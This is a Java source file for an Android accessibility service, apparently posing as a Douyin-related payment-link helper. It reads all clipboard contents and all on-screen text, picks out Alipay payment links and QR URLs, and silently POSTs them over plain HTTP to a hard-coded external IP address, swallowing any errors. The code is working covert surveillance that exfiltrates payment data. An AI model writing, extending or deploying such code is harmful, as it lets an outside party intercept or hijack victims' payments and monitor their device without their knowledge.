package com.douyin.paylink;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.content.ClipboardManager;
import android.content.ClipData;

public class PaymentLinkService extends AccessibilityService {
    
    private ClipboardManager clipboardManager;
    
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        clipboardManager = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        
        // 监听剪贴板
        clipboardManager.addPrimaryClipChangedListener(() -> {
            ClipData clip = clipboardManager.getPrimaryClip();
            if (clip != null && clip.getItemCount() > 0) {
                String text = clip.getItemAt(0).getText().toString();
                checkPaymentLink(text);
            }
        });
    }
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // 监听窗口变化
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
            String className = event.getClassName() != null ? event.getClassName().toString() : "";
            
            // 检测支付宝启动
            if (packageName.contains("alipay")) {
                MainActivity.addLog("检测到支付宝启动: " + packageName);
            }
        }
        
        // 扫描屏幕内容
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode != null) {
            scanForPaymentLink(rootNode);
        }
    }
    
    private void scanForPaymentLink(AccessibilityNodeInfo node) {
        if (node.getText() != null) {
            checkPaymentLink(node.getText().toString());
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                scanForPaymentLink(child);
            }
        }
    }
    
    private void checkPaymentLink(String text) {
        if (text.startsWith("alipay://") || text.startsWith("alipays://") || 
            text.contains("qr.alipay.com")) {
            sendToServer(text);
        }
    }
    
    private void sendToServer(String link) {
        // 显示到界面
        MainActivity.addLog(link);
        
        // 发送到服务器
        new Thread(() -> {
            try {
                java.net.URL url = new java.net.URL("http://43.162.112.203:5000/payment");
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                
                String json = "{\"url\":\"" + link.replace("\"", "\\\"") + "\"}";
                java.io.OutputStream os = conn.getOutputStream();
                os.write(json.getBytes());
                os.flush();
                os.close();
                conn.getResponseCode();
            } catch (Exception e) {}
        }).start();
    }
    
    @Override
    public void onInterrupt() {}
}
